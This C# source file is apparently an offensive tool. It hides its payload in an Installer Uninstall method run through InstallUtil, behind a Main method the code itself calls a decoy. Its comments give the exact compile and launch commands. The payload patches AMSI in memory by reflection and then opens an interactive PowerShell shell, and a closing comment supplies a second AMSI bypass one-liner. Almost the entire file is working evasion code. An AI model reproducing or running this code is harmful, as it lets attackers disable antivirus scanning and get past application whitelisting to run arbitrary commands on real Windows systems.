//c:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /reference:"C:\windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll" c:\users\Administrator\Desktop\disamsi.cs
//c:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U disamsi.exe
using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;


namespace CInstaller
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            string cmd;
            Runspace rs = RunspaceFactory.CreateRunspace();
            PowerShell ps = PowerShell.Create();
            rs.Open();
            ps.Runspace = rs;

            // disable amsi
            ps.AddScript(@"$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "" * iUtils"") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "" * Context"") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)");
            ps.Invoke();

            while (true)
            {
                Console.Write("PS " + Directory.GetCurrentDirectory() + ">");
                Stream inputStream = Console.OpenStandardInput();

                cmd = Console.ReadLine();

                if (String.Equals(cmd, "exit"))
                    break;

                Pipeline pipeline = rs.CreatePipeline();
                pipeline.Commands.AddScript(cmd);

                pipeline.Commands.Add("Out-String");

                try
                {
                    Collection<PSObject> results = pipeline.Invoke();
                    StringBuilder stringBuilder = new StringBuilder();

                    foreach (PSObject obj in results)
                    {
                        stringBuilder.Append(obj);
                    }

                    Console.WriteLine(stringBuilder.ToString().Trim());
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }


            }

            rs.Close();
        }
    }

}
//run this after to bypass amsi if its not already patched
//$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Failed") {$f=$e}};$f.SetValue($null,$true)
